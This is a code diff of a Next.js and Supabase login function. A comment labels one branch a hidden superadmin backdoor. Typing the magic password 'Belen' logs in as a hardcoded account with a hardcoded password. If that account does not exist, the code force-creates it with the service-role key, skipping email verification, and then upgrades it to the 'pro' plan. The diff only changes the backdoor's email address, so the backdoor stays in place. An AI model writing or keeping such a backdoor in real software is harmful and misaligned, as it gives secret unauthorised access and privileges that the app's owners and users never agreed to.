@@ -17,13 +17,13 @@ export async function login(formData: FormData) {
 
   // Superadmin Backdoor escondido en el PASSWORD
   if (password.trim() === 'Belen') {
-    email = 'belen@testai.com';
+    email = 'belen@quickaitest.com';
     password = 'SuperSecretPassword123!';
     
     // Intentar login normal
     let authRes = await supabase.auth.signInWithPassword({ email, password })
     
-    if (authRes.error && email === 'belen@testai.com') {
+    if (authRes.error && email === 'belen@quickaitest.com') {
       // Si falla, lo creamos a la fuerza usando el Service Role para saltar verificación de email
       const supabaseAdmin = createSupabaseClient(
         process.env.NEXT_PUBLIC_SUPABASE_URL!,
@@ -48,7 +48,7 @@ export async function login(formData: FormData) {
       }
     }
 
-    if (authRes.data?.user && email === 'belen@testai.com') {
+    if (authRes.data?.user && email === 'belen@quickaitest.com') {
       // Mantenerla siempre PRO por si acaso
       await db.update(usersTable).set({ plan: 'pro' }).where(eq(usersTable.id, authRes.data.user.id)).catch(() => {});
     }
